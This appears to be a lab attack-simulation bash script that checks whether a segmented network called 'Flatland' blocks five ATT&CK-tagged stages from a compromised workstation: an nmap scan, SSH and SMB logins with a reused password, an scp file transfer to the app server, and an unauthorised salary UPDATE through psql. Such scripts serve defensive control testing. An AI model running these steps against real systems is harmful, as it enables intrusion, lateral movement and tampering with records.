#!/bin/bash
# Attacker script - runs INSIDE the workstation (ws). Assumes the attacker owns ws and
# has a reused password (it / Summer2024). Each stage prints SUCCEEDED or BLOCKED.
P='Summer2024'
SSHO="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o LogLevel=ERROR"
ip_of(){ getent hosts "$1" | awk '{print $1}'; }
WEB=$(ip_of web)
ok=0; n=0
stage(){ n=$((n+1)); if [ "$1" = 0 ]; then echo "[!] $2 -> SUCCEEDED"; ok=$((ok+1)); else echo "[x] $2 -> BLOCKED"; fi; echo; }

echo "=== Flatland attack run $(date -Is) from $(hostname) ($(hostname -I | xargs)) ==="; echo

echo "--- A1 Port scan / service discovery (T1046, T1018)"
scan=$(nmap -Pn -sT -n -T4 --max-retries 1 --host-timeout 40s \
        -p 22,80,139,443,445,5432,8080 web app db files admin -oG - 2>/dev/null)
exposed=0
while read -r line; do
  ip=$(awk '{print $2}' <<<"$line")
  for p in $(grep -oE '[0-9]+/open' <<<"$line" | cut -d/ -f1); do
    if [ "$ip" = "$WEB" ] && [ "$p" = 443 ]; then echo "    $ip:$p open (public web - expected)"; continue; fi
    echo "    $ip:$p OPEN"; exposed=$((exposed+1))
  done
done < <(grep 'Ports:' <<<"$scan")
echo "    internal services exposed to workstation: $exposed"
[ "$exposed" -gt 0 ]; stage $? "A1 scan finds internal services"

echo "--- A2 SSH login to database host (T1021.004)"
out=$(timeout 15 sshpass -p "$P" ssh $SSHO it@db 'hostname; id' 2>&1); rc=$?; echo "$out" | sed 's/^/    /'
stage $rc "A2 SSH into db"

echo "--- A3 SMB connection to file server (T1021.002)"
out=$(timeout 15 smbclient //files/share -U "it%$P" -c 'ls' 2>&1); rc=$?; echo "$out" | tail -3 | sed 's/^/    /'
stage $rc "A3 SMB session to files"

echo "--- A4 Lateral tool transfer: copy file to app server (T1570)"
echo 'echo pwned from ws' > /tmp/tool.sh
out=$(timeout 15 sshpass -p "$P" scp $SSHO /tmp/tool.sh it@app:/tmp/tool.sh 2>&1 \
      && timeout 15 sshpass -p "$P" ssh $SSHO it@app 'ls -l /tmp/tool.sh' 2>&1); rc=$?; echo "$out" | sed 's/^/    /'
stage $rc "A4 file copied to app"

echo "--- A5 Unauthorised change to employee record (T1565.001 Stored Data Manipulation)"
# The attacker reuses the app's database password found on the workstation.
out=$(PGCONNECT_TIMEOUT=5 PGPASSWORD=AppDb2024 psql -h db -U appuser -d corp -tA \
      -c "UPDATE employees SET salary = 999999 WHERE id = 3" 2>&1); rc=$?
echo "    $out"; [ $rc -eq 0 ] && grep -q "UPDATE 1" <<<"$out"; stage $? "A5 db row modified"

echo "=== RESULT: $ok/$n attack stages succeeded ==="
